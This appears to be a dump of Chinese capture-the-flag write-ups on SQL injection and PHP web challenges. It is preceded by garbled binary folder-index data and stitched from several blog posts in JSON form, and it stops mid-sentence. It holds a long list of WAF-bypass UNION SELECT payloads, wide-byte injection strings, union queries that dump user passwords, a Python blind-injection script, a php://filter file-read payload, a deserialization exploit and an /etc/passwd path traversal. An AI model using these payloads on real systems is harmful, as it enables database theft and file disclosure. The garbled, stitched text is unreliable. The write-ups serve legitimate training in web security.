\u0000c\u0000o\u0000m\u0000m\u0000e\u0000n\u0000t\u0000.\u0000p\u0000h\u0000pIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0000Ì\u0000\u0000\u0000(\u0000\u0000\u0000\u0001ÿÿ\u0000\u0000\u0000\u0000\u0000\u0003\u0000c\u0000s\u0000sIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0001R\u0000\u0000\u0000(ÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000\u0019\u0000f\u0000l\u0000a\u0000g\u0000_\u00008\u00009\u00004\u00006\u0000e\u00001\u0000f\u0000f\u00001\u0000e\u0000e\u00003\u0000e\u00004\u00000\u0000f\u0000.\u0000p\u0000h\u0000pIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0001Ø\u0000\u0000\u0000(ÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000\u0005\u0000f\u0000o\u0000n\u0000t\u0000sIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0000F\u0000\u0000\u0000ÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000 \u0000i\u0000n\u0000d\u0000e\u0000x\u0000.\u0000p\u0000h\u0000pIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0000Ì\u0000\u0000\u0000\u0000\u0000\u0000\u0002ÿÿ\u0000\u0000\u0000\u0000\u0000\u0002\u0000j\u0000sIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0001R\u0000\u0000\u0000ÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000 \u0000l\u0000o\u0000g\u0000i\u0000n\u0000.\u0000p\u0000h\u0000pIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0001Ø\u0000\u0000\u0000ÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000 \u0000m\u0000y\u0000s\u0000q\u0000l\u0000.\u0000p\u0000h\u0000pIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0000F\u0000\u0000\u0001\bÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000\u0006\u0000v\u0000e\u0000n\u0000d\u0000o\u0000rIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0000Ì\u0000\u0000\u0001\bÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000 \u0000w\u0000r\u0000i\u0000t\u0000e\u0000_\u0000d\u0000o\u0000.\u0000p\u0000h\u0000pIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0001R\u0000\u0000\u0001\bÿÿÿÿÿÿ\u0000\u0000 读取flag_8946e1ff1ee3e40f.php 1123&#x27;,content=(select hex( load_file(&#x27;/tmp/html/flag_8946e1ff1ee3e40f.php&#x27;))),/* 13C3F7068700A24666C6167203D2027666C61677B66396361316136622D396437382D313165382D393061332D6334623330316237623939627D273B0A3F3E0A 在用脚本解密一下 在buuctf怎么提交flag都不对。。 先知社区"},{"title":"SQL注入WAF-bypass","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/SQL注入WAF-bypass/","text":"sql语句中空格的代替方法: 123456/*!50540select user()*/ mysql(独有)内联注释,!后面的数字是版本号，表示当数据库版本&gt;=5.5.40时执行SQL语句/**/ mysql多行注释%09(\\t),%0a(\\n),%0b,%0c,%0d(\\r),%20,%a0 一些空白字符1.1、2.3、1. 浮点数形式0e1、1e7 科学计数法+、-、!、@、~、&#123;&#125;、&quot;、&#x27;、()、`` 一些特殊字符 在mysql客户端下测试，所以%09、%0a、%0b这种输入肯定是不行的，要转成%0b、%0c这种的url解码结果输入才行。正常SQL注入的话是在网页输入框中输入，浏览器会自动解码，所以填%09，%0a这种形式。 1234567=：like，regexp，liker，&lt;&gt;，！=等 （一般ctf中常见）and：&amp;&amp;or: xor，&amp;，^，||（and或or可以相互替换，只是两边条件不同）逗号：盲注中 from 1 for 1,联合查询中 A join B。 user=1’ union select 1,2,3,4,5,6,7,database();#&amp;password=1#&amp;login=yes 数据库长度是6 名称 seacms 表 adword, content,download,image id,ad1,ad2,ad3,date le,toutiao,author,keywords,description,xs,hit,images,content,dat ?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x00),price,name) /index.php?con=index&amp;act=search&amp;keyword=&amp;sort=’ or ‘1’# 1234567891011121314151617MariaDB [test]&gt; select * from student order by if(1,pass,id);+-----+-------+-------+------------+| id | name | score | pass |+-----+-------+-------+------------+| 456 | world | 65.23 | flag&#123;ksgxv || 123 | hello | 12.23 | hasaki |+-----+-------+-------+------------+2 rows in set (0.000 sec)MariaDB [test]&gt; select * from student order by if(0,pass,id);+-----+-------+-------+------------+| id | name | score | pass |+-----+-------+-------+------------+| 123 | hello | 12.23 | hasaki || 456 | world | 65.23 | flag&#123;ksgxv |+-----+-------+-------+------------+2 rows in set (0.000 sec) key{d114072d4afc12683d337e6d25e558c5} ?id=%df%27%20or%201=1%23 ?id=1%df%27%20order%20by%203%23 三列 ?id=1%df%27%%20and%201=2%20ununionion%20select%201,2%23 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘and//1=2//un//ion//////1,2#’’ at line 1 存在union select的过滤，竟然可以大小写绕过。。。 ?id=1%df%27%20and%201=2%20UniOn%20SeleCT%201,2,database()%23 test ?id=1%df%27 and 1=2 uNion seLect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 flag,news,user ?id=1%df%27 and 1=2 uNion seLect 1,2,group_concat(column_name) from information_schema.columns where table_name=flag%23 ?id=1%df%27 and 1=2 uNion seLect 1,2,flag from flag%23 index.php?con=index&amp;act=search&amp;keyword=&amp;cid=0&amp;sort=if(1,asc,desc)# 绕过union select过滤 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109####WAF Bypassing Strings: /*!%55NiOn*/ /*!%53eLEct*/ %55nion(%53elect 1,2,3)-- - +union+distinct+select+ +union+distinctROW+select+ /**//*!12345UNION SELECT*//**/ /**//*!50000UNION SELECT*//**/ /**/UNION/**//*!50000SELECT*//**/ /*!50000UniON SeLeCt*/ union /*!50000%53elect*/ +#uNiOn+#sEleCt +#1q%0AuNiOn all#qa%0A#%0AsEleCt /*!%55NiOn*/ /*!%53eLEct*/ /*!u%6eion*/ /*!se%6cect*/ +un/**/ion+se/**/lect uni%0bon+se%0blect %2f**%2funion%2f**%2fselect union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A REVERSE(noinu)+REVERSE(tceles) /*--*/union/*--*/select/*--*/ union (/*!/**/ SeleCT */ 1,2,3) /*!union*/+/*!select*/ union+/*!select*/ /**/union/**/select/**/ /**/uNIon/**/sEleCt/**/ /**//*!union*//**//*!select*//**/ /*!uNIOn*/ /*!SelECt*/ +union+distinct+select+ +union+distinctROW+select+ +UnIOn%0d%0aSeleCt%0d%0a UNION/*&amp;test=1*/SELECT/*&amp;pwn=2*/ un?+un/**/ion+se/**/lect+ +UNunionION+SEselectLECT+ +uni%0bon+se%0blect+ %252f%252a*/union%252f%252a /select%252f%252a*/ /%2A%2A/union/%2A%2A/select/%2A%2A/ %2f**%2funion%2f**%2fselect%2f**%2f union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A /*!UnIoN*/SeLecT+ #####Union Select by PASS with Url Encoded Method: %55nion(%53elect) union%20distinct%20select union%20%64istinctRO%57%20select union%2053elect %23?%0auion%20?%23?%0aselect %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect %55nion %53eLEct u%6eion se%6cect unio%6e %73elect unio%6e%20%64istinc%74%20%73elect uni%6fn distinct%52OW s%65lect %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7 大小写绕过 特殊字符绕过waf 例如 1url/index.php?%00file=xxx PDO下的bypass PDO真的安全吗？ PDO执行流程 PDO 宽字节 https://www.freebuf.com/column/165567.html 如果mysql设置成GBK等多字节编码的话，就会存在绕过 以PHP和MYSQL为例，MySQL收到请求时将请求数据从character_set_client转换为character_set_connection;在进行内部操作前，将请求数据从character_set_connection转换为内部操作字符集，使用每个字段的character_set的值将操作结果从内部操作集转换为character_set_results。而宽字节注入发生的位置就是PHP将请求发送到MYSQL时字符集使用character_set_client设置值进行了一次编码。 php客户端使用单字节，php和mysql的链接层或者mysql服务端用的是GBK等编码就会出现问题 MySQL 5.6 default: big5, cp932, gb2312, gbk and sjis. 12345$pdo-&gt;query(&#x27;SET NAMES gbk&#x27;);$var = &quot;\\xbf\\x27 OR 1=1 /*&quot;;$query = &#x27;SELECT * FROM test WHERE name = ? LIMIT 1&#x27;;$stmt = $pdo-&gt;prepare($query);$stmt-&gt;execute(array($var)); 当Mysql数据库my.ini文件中设置编码为gbk时， 我们的PHP程序哪怕使用了addslashes()，PDO::quote，mysql_real_escape_string()、mysql_escape_string()等函数、方法，或配置了magic_quotes_gpc=on，依然可以通过构造%df’的方法绕过转义 对于mysql_real_escape_string()：https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string 修复方法： The problem here is that we didn’t call the C API’s mysql_set_charset() instead of SET NAMES. If we did, we’d be fine provided we are using a MySQL release since 2006. If you’re using an earlier MySQL release, then a bug in mysql_real_escape_string() meant that invalid multibyte characters such as those in our payload were treated as single bytes for escaping purposes even if the client had been correctly informed of the connection encoding and so this attack would still succeed. The bug was fixed in MySQL 4.1.20, 5.0.22 and 5.1.11. But the worst part is that PDO didn’t expose the C API for mysql_set_charset() until 5.3.6, so in prior versions it cannot prevent this attack for every possible command! It’s now exposed as a DSN parameter, which should be used instead of SET NAMES… 客户端和服务端编码统一 关闭模拟预处理 设置 SQL_MODE=“NO_BACKSLASH_ESCAPES”'); 将反斜杠作为字符串而不是转义 堆叠 PDO分为模拟预处理和非模拟预处理。 模拟预处理是防止某些数据库不支持预处理而设置的，也是众多注入的元凶 在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。 PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。 非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步： 第一步是prepare阶段，发送SQL语句模板到数据库服务器； 第二步通过execute()函数发送占位符参数给数据库服务器执行。 PDO产生安全问题的主要设置如下： PDO::ATTR_EMULATE_PREPARES //模拟预处理(默认开启 PDO::ATTR_ERRMODE //报错 PDO::MYSQL_ATTR_MULTI_STATEMENTS //允许多句执行(默认开启) PDO默认是允许多句执行和模拟预编译的，在用户输入参数可控的情况下，会导致堆叠注入。 报错 当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时 无论是否开启PDO::ATTR_EMULATE_PREPARES-模拟预处理 此时SQL语句如果产生报错，PDO则会将报错抛出 PDO真的安全吗？ PDO执行流程 PDO https://paper.seebug.org/1636/ SQL注入之WAF-Bypass SQL注入之Bypass SQL注入ByPass的一些小技巧"},{"title":"极客大挑战2019","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/极客大挑战2019/","text":"EasySQL 尝试了一下空格,or,'等发现没有过滤然后试了个万能密码 1' or '1…就出来了？？？。。。 可能是buuoj环境搭建错了吧。。 看了看别的大佬的博客 emmm，确实就这么个样。。过过过。。 Havefun 页面上什么都没有，页面源码有注释 12345$cat=$_GET[&#x27;cat&#x27;];echo $cat;if($cat==&#x27;dog&#x27;)&#123; echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;&#125; 输入URL/?cat=dog然后。。。flag又出来了 Secret File 源码: 123456789101112131415 &lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 直接输入flag提示看不到，尝试用filter伪协议读取 secr3t.php?file=php://filter/read=convert.base64-encode/resource=./flag.php 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = &#x27;flag&#123;c22446be-2016-4ec1-9a76-d3e06a6e98b3&#125;&#x27;; $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27; ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; flag在里面 PHP www.zip index.php关键代码 12345&lt;?phpinclude &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];$res=unserialize($select);?&gt; class.php 12345678910111213141516171819202122232425262728293031class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125; 构造饭序列化字符串，更改对象数量绕过_wakeup函数即可 exp.php 12345678910111213&lt;?phpclass Name&#123; private $username=&#x27;admin&#x27;; private $password=&#x27;100&#x27;;&#125;$o = new Name();var_dump(serialize($o));var_dump(urlencode(serialize($o)));?&gt;O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D 修改O%3A4%3A%22Name%22%3A2% 4 A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D LoveSQL 测试admin' or '1成了，报错注入 1234567891011admin&#x27; order by 3#-1&#x27; union select 1,2,database()#geek-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#geekuser,l0ve1ysq1-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;#id,username,password-1&#x27; union select 1,2,group_concat(username) from l0ve1ysq1#&#x27;cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag&#x27;-1&#x27; union select 1,2,group_concat(password) from l0ve1ysq1#&#x27;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;afcdcab8-ff94-4803-a558-0aa5d83284d0&#125;&#x27;"},{"title":"CISCN2019华北赛区","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/CISCN2019华北赛区/","text":"Hack World 搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等，包括/**/，后来看源码知道是过滤了*。 有意思的是输入1/1时会正常返回结果，可以判断这是数字型的sql注入。 根据1和2返回结果的不同，可能是bool盲注，()没有过滤，可以使用大部分函数,空格的绕过有这些方法我测试是可以的 %09 %0a %0b %0c %0d /**/ /*!*/或者直接tab %20 好像没法绕，%00截断好像也影响sql语句的执行 或者用括号也可以。任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 本题中可以if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2) 写个脚本跑一下(本地测试的 buu复现的环境网络不行所以必须加延时,时间太久了) 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport stringurl=&#x27;http://127.0.0.1/CTF/CISCN2019/HackWorld/index.php&#x27;letter = &#x27;&#123;&#125;&#123;&#125;0123456789_-&#123;&#125;,()&#x27;.format(string.ascii_uppercase,string.ascii_lowercase,&quot;&#123;&#125;&quot;)def BiggerThanMid(payload,num): # if bigger than num,it return True payload=payload.format(num) data=&#123; &quot;id&quot;: payload, &#125; content=requests.post(url,data=data) if &quot;hello&quot; in content.text.encode(&quot;utf-8&quot;).decode(content.apparent_encoding): return True else: return Falsedef BinaryInjection(payload): # maxLength: Assume the maximum length of the database min = 1 # 最小的下标 max = 255 # 最大的下标 while (max-min)&gt;1: mid = (max + min) // 2 # 中间的下标每次向下取整(rounding down) if BiggerThanMid(payload,mid) : min = mid # 大于需要的猜的数，则将最小下标变为中间的 else : max = mid # 小于需要的猜的数，则将最大下标变为中间的 return max# this function getxxxName or getFlagdef getxxxName(rawpayload,length=20): xxxName=&quot;&quot; for i in range(1,length): payload=rawpayload.format(i,&quot;&#123;&#125;&quot;) xxxName+=chr(BinaryInjection(payload)) print(xxxName) return xxxNameif __name__ == &quot;__main__&quot;: getTableName=&quot;if(ascii(substr((select\\tflag\\tfrom\\tflag),&#123;&#125;,1))&gt;&#123;&#125;,123,456)&quot; TableName=getxxxName(getTableName,40) 源码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php$dbuser=&#x27;root&#x27;;$dbpass=&#x27;root&#x27;;function safe($sql)&#123; #被过滤的内容 函数基本没过滤 $blackList = array(&#x27; &#x27;,&#x27;||&#x27;,&#x27;#&#x27;,&#x27;-&#x27;,&#x27;;&#x27;,&#x27;&amp;&#x27;,&#x27;+&#x27;,&#x27;or&#x27;,&#x27;and&#x27;,&#x27;`&#x27;,&#x27;&quot;&#x27;,&#x27;insert&#x27;,&#x27;group&#x27;,&#x27;limit&#x27;,&#x27;update&#x27;,&#x27;delete&#x27;,&#x27;*&#x27;,&#x27;into&#x27;,&#x27;union&#x27;,&#x27;load_file&#x27;,&#x27;outfile&#x27;,&#x27;./&#x27;); foreach($blackList as $blackitem)&#123; if(stripos($sql,$blackitem))&#123; return False; &#125; &#125; return True;&#125;if(isset($_POST[&#x27;id&#x27;]))&#123; $id = $_POST[&#x27;id&#x27;];&#125;else&#123; die();&#125;$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db)&#123; die(mysql_error());&#125; mysql_select_db(&quot;ctf&quot;,$db);if(safe($id))&#123; $query = mysql_query(&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;); if($query)&#123; $result = mysql_fetch_array($query); if($result)&#123; echo $result[&#x27;content&#x27;]; &#125;else&#123; echo &quot;Error Occured When Fetch Result.&quot;; &#125; &#125;else&#123; var_dump($query); &#125;&#125;else&#123; die(&quot;SQL Injection Checked.&quot;);&#125; [Day1 Web1] Dropbox 注册登录后，页面有上传文件选项，上传个一句话php提示只能上传图片，后缀改成png，提示上传成功，还能下载，拦截下载请求 将filename改成../../../../../etc/passwd，发现可以下载，存在任意文件读取 读取根目录flag不存在,读取一下网页源码/var/www/html/xxxx.php,给出主要部分 class.php, 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; download.php 12345678910111213141516171819202122232425&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123; Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo &quot;File not exist&quot;;&#125;?&gt; upload.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123; $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $pos = strrpos($filename, &quot;.&quot;); if ($pos !== false) &#123; $filename = substr($filename, 0, $pos); &#125; $fileext = &quot;.gif&quot;; switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123; case &#x27;image/gif&#x27;: $fileext = &quot;.gif&quot;; break; case &#x27;image/jpeg&#x27;: $fileext = &quot;.jpg&quot;; break; case &#x27;image/png&#x27;: $fileext = &quot;.png&quot;; break; default: $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); die(); &#125; if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123; $dst = $_SESSION[&#x27;sandbox&#x27;] . $filename . $fileext; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125; else &#123; $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125;&#125;?&gt; delete.php 12345678910111213141516include &quot;class.php&quot;;chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);&#125; else &#123; Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);&#125;?&gt; 发现class.php File类中有 123public function close() &#123; return file_get_contents($this-&gt;filename); &#125; 这个方法在download.php中被调用了，这个方法的filename在download中通过$filename = (string) $_POST['filename'];赋值，调用这个方法前需要通过一个if检查 12345if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123; Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close();&#125; open方法要求这个文件必须存在并且不是目录: 12345678public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; 算了，看看别人的吧 知识点 1.1 open_basedir https://www.cnblogs.com/guohong-hu/p/9350076.html 在in_set这个函数中，可以设置php的一些配置，其中就包括open_basedir ，用来限制当前程序可以访问的目录。后来问了一下朱师傅，了解到：它是可以访问设置目录下的所有下级目录。 若&quot;open_basedir = /dir/user&quot;, 那么目录 “/dir/user” 和 “/dir/other&quot;都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。”.&quot;可代表当前目录，open_basedir也可以同时设置多个目录,在Windows中用分号分隔目录,在任何其它系统中用冒号分隔目录。例： ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 就是只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录。解释了为什么要在delete.php中利用payload，而不是download.php 1.2 chdir() mkdir() chdir() 现实目录跳跃，解释了为什么下载时要filename = …/…/indx.php ，而不是filename = index.php。 mkdir() 创建一个文件夹，顺带提一下。 1.3 function all($func, $args) php的魔术方法，为什么要叫魔术方法？__call($func,$args)会在对象调用的方法不存在时，自动执行。 $func:被调用的方法名，所以func()在这个魔术方法中，可以表示被调用的那个方法；‘func()在这个魔术方法中，可以表示被调用的那个方法； `func()在这个魔术方法中，可以表示被调用的那个方法；‘args `: 被调用方法中的参数（这是个数组） 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125;&#125; 在本题中，此方法的作用，是去调用对象没有的方法。首先把要调用的方法，压进$this-&gt;funcs中，然后遍历每一个文件，让每一个文件，都去调用刚才的方法。比如在index.php中，就出现了这个函数的调用。 当执行 $a = new 